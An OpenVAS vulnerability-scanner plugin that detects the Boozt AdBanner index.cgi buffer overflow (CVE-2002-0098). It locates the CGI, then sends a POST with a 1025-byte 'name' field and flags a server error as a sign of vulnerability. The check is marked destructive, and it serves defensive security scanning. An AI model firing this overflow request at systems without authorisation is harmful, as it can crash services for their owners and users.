# OpenVAS Vulnerability Test
# $Id: boozt_admin_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Boozt index.cgi overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11082");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(6281);
  script_cve_id("CVE-2002-0098");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Boozt index.cgi overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");

  script_tag(name:"summary", value:"It seems that index.cgi from Boozt AdBanner
  is installed and is vulnerable to a buffer overflow:

  It doesn't check the length of user supplied variables before copying them to internal arrays.");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make the web server
  crash continually or even execute arbirtray code on the system.");

  script_tag(name:"affected", value:"Boozt 0.9.8alpha, other versions might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

d1[0] = "/cgi-bin";
d1[1] = "/scripts";
d1[2] = "";

d2[0] = "/boozt";
d2[1] = "";

d3[0] = "/admin";
d3[1] = "";

function find_boozt(port) {
  for(i = 0; i < 3; i++) {
    for(j = 0; j < 2; j++) {
      for(k = 0; k < 2; k++) {
        url = string(d1[i], d2[j], d3[k], "/index.cgi");
        req = http_get(port:port, item:url);
        res = http_keepalive_send_recv(port:port, data:req);
        if(ereg(string:res, pattern:"^HTTP/1\.[01] 200 ") && "BOOZT Adbanner system" >< res) {
          return(url);
        }
      }
    }
  }
  return FALSE;
}

port = get_http_port(default:80);
bz = find_boozt(port:port);
if(!bz)
  exit(0);

r = http_post(port:port, item:bz);
r = r - string("\r\n\r\n");
r = string(r, "\r\nContent-Length: 1030\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n\r\n",
              "name=", crap(1025), "\r\n\r\n");

soc = http_open_socket(port);
if(!soc)
  exit(0);

send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);

if(ereg(string:r, pattern:"^HTTP/1\.[01] +5[0-9][0-9] ")) {
  security_message(port:port);
  exit(0);
}

report = "It seems that index.cgi from Boozt AdBanner is installed.

Old versions of the CGI were vulnerable to a buffer overflow hower the scanner could not exploit it there.";
security_message(port:port, data:report);
exit(0);